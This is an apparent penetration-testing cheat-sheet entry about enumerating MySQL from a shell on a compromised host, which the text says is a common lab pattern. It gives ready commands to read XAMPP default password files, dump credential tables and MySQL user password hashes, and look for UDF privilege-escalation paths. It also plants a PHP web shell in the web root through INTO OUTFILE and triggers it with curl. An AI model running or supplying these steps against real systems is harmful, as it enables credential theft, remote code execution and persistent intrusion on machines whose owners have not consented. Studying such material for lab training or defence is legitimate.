title: MySQL — On-Box Enumeration (Non-Interactive Shell)
body:
When MySQL is running on a box you have a shell on, the interactive client will hang your non-TTY session if you run it without the -e flag. Always use -e for non-interactive execution. Always force TCP with -h 127.0.0.1 — named pipes and sockets will hang or fail in a remote shell.

The pattern: show databases → identify interesting db → show tables → select * from likely-creds-table.

XAMPP ships MySQL with root and no password by default. The passwords.txt in C:\xampp\ will confirm this. Check it before trying any credentials.

The 'creds' database with a 'creds' table is a common lab pattern — don't just look at application databases, look at ALL databases for custom tables.
cmd:
# ══════════════════════════════════════════════════
# CHECK XAMPP DEFAULT CREDS FIRST
# ══════════════════════════════════════════════════
type C:\xampp\passwords.txt
# If XAMPP: root with no password is default
# Also check:
type C:\xampp\mysql\mysql-init.txt 2>nul

# ══════════════════════════════════════════════════
# NON-INTERACTIVE CONNECTION (critical — no -e = hangs)
# ══════════════════════════════════════════════════
# Windows (XAMPP):
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "SELECT 1;"
# No password prompt = connected. Blank password works.

# Linux:
mysql -u root -h 127.0.0.1 -P 3306 -e "SELECT 1;"
# Or with password:
mysql -u root -p'password' -h 127.0.0.1 -P 3306 -e "SELECT 1;"

# ══════════════════════════════════════════════════
# ENUMERATE — ALWAYS THIS ORDER
# ══════════════════════════════════════════════════
# 1. List all databases:
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "show databases;"

# 2. List tables in a specific database (db name goes AFTER the query string):
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "show tables;" "<dbname>"

# 3. Dump everything from a table:
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "select * from <table>;" "<dbname>"

# 4. If you see a 'creds', 'users', 'accounts', 'passwords' table — dump it immediately:
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "select * from creds;" "creds"

# ══════════════════════════════════════════════════
# WRITE A WEBSHELL (if web server is running)
# ══════════════════════════════════════════════════
# Find web root first:
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "SHOW VARIABLES LIKE 'secure_file_priv';"
# If secure_file_priv is empty string, INTO OUTFILE works anywhere:
C:\xampp\mysql\bin\mysql.exe -u root -h 127.0.0.1 -P 3306 -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';"
# Then test: curl http://<target>/shell.php?cmd=whoami

# ══════════════════════════════════════════════════
# LINUX MYSQL SHORTCUTS
# ══════════════════════════════════════════════════
mysql -u root -h 127.0.0.1 -e "show databases;"
mysql -u root -h 127.0.0.1 -e "show tables;" mysql
mysql -u root -h 127.0.0.1 -e "select user,password,host from user;" mysql
# Look for UDF (user defined functions) for privesc:
mysql -u root -h 127.0.0.1 -e "select * from func;" mysql
warn: The most common mistake: running mysql without -e in a non-TTY shell — it hangs waiting for stdin. Always use -e. The second most common mistake: omitting -h 127.0.0.1 on Windows, which causes the client to try a named pipe instead of TCP and either hang or fail. The database name at the end of the command (after the query string) is the correct syntax for specifying which database to use with -e — it is NOT a bug that it comes after the quoted query.
